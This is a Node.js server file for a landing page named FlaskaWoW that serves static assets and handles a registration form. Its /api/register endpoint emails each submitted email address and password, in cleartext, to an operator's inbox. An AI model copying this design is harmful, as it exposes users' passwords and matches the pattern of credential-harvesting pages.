import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { existsSync, readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import nodemailer from "nodemailer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envFilePath = path.join(__dirname, ".env");

if (existsSync(envFilePath)) {
  const envLines = readFileSync(envFilePath, "utf-8").split(/\r?\n/);

  for (const line of envLines) {
    const trimmed = line.trim();

    if (!trimmed || trimmed.startsWith("#")) {
      continue;
    }

    const separatorIndex = trimmed.indexOf("=");

    if (separatorIndex === -1) {
      continue;
    }

    const key = trimmed.slice(0, separatorIndex).trim();
    const value = trimmed.slice(separatorIndex + 1).trim();

    if (key && !(key in process.env)) {
      process.env[key] = value;
    }
  }
}

const port = Number(process.env.PORT) || 3000;

const staticFiles = new Map([
  ["/", { file: "index.html", type: "text/html; charset=utf-8" }],
  ["/index.html", { file: "index.html", type: "text/html; charset=utf-8" }],
  ["/styles.css", { file: "styles.css", type: "text/css; charset=utf-8" }],
  ["/script.js", { file: "script.js", type: "application/javascript; charset=utf-8" }],
  ["/favicon.svg", { file: "favicon.svg", type: "image/svg+xml" }],
  ["/favicon.ico", { file: "favicon.svg", type: "image/svg+xml" }],
]);

const smtpHost = process.env.SMTP_HOST || "";
const smtpPort = Number(process.env.SMTP_PORT) || 587;
const smtpUser = process.env.SMTP_USER || "";
const smtpPass = process.env.SMTP_PASS || "";
const recipientEmail = process.env.RECIPIENT_EMAIL || "";
const senderEmail = process.env.SENDER_EMAIL || smtpUser;

const transporter =
  smtpHost && smtpUser && smtpPass
    ? nodemailer.createTransport({
        host: smtpHost,
        port: smtpPort,
        secure: smtpPort === 465,
        auth: {
          user: smtpUser,
          pass: smtpPass,
        },
      })
    : null;

const sendJson = (response, statusCode, payload) => {
  response.writeHead(statusCode, {
    "Content-Type": "application/json; charset=utf-8",
  });
  response.end(JSON.stringify(payload));
};

const sendText = (response, statusCode, message) => {
  response.writeHead(statusCode, {
    "Content-Type": "text/plain; charset=utf-8",
  });
  response.end(message);
};

const readRequestBody = async (request) => {
  const chunks = [];

  for await (const chunk of request) {
    chunks.push(chunk);
  }

  return Buffer.concat(chunks).toString("utf-8");
};

const escapeHtml = (value) =>
  value
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");

const validatePayload = ({ email, password, message }) => {
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return "Укажи корректный email.";
  }

  if (!password || password.length < 6) {
    return "Укажи пароль минимум из 6 символов.";
  }

  if (email.length > 120 || password.length > 120 || message.length > 2000) {
    return "Один из полей слишком длинный.";
  }

  return null;
};

const server = createServer(async (request, response) => {
  try {
    if (!request.url) {
      sendText(response, 400, "Bad Request");
      return;
    }

    const requestUrl = new URL(request.url, `http://${request.headers.host || "localhost"}`);

    if (request.method === "GET" && staticFiles.has(requestUrl.pathname)) {
      const asset = staticFiles.get(requestUrl.pathname);
      const filePath = path.join(__dirname, asset.file);
      const fileContents = await readFile(filePath);

      response.writeHead(200, { "Content-Type": asset.type });
      response.end(fileContents);
      return;
    }

    if (request.method === "POST" && requestUrl.pathname === "/api/register") {
      if (!transporter || !recipientEmail || !senderEmail) {
        sendJson(response, 500, {
          error: "Почта на сервере ещё не настроена. Заполни SMTP-переменные.",
        });
        return;
      }

      const rawBody = await readRequestBody(request);
      const payload = JSON.parse(rawBody);
      const email = String(payload.email || "").trim();
      const password = String(payload.password || "").trim();
      const message = String(payload.message || "").trim();

      const validationError = validatePayload({ email, password, message });

      if (validationError) {
        sendJson(response, 400, { error: validationError });
        return;
      }

      const safeEmail = escapeHtml(email);
      const safePassword = escapeHtml(password);
      const safeMessage = message ? escapeHtml(message).replaceAll("\n", "<br>") : "Без комментария";

      await transporter.sendMail({
        from: senderEmail,
        to: recipientEmail,
        replyTo: email,
        subject: `Новая заявка FlaskaWoW от ${email}`,
        text: [
          "Новая заявка с лендинга FlaskaWoW",
          "",
          `Email: ${email}`,
          `Пароль: ${password}`,
          `Комментарий: ${message || "Без комментария"}`,
        ].join("\n"),
        html: `
          <h2>Новая заявка с лендинга FlaskaWoW</h2>
          <p><strong>Email:</strong> ${safeEmail}</p>
          <p><strong>Пароль:</strong> ${safePassword}</p>
          <p><strong>Комментарий:</strong><br>${safeMessage}</p>
        `,
      });

      sendJson(response, 200, { ok: true });
      return;
    }

    sendText(response, 404, "Not Found");
  } catch (error) {
    if (error instanceof SyntaxError) {
      sendJson(response, 400, { error: "Некорректный формат данных." });
      return;
    }

    console.error(error);
    sendJson(response, 500, { error: "Сервер не смог обработать заявку." });
  }
});

server.listen(port, () => {
  console.log(`FlaskaWoW server is running on http://localhost:${port}`);
});
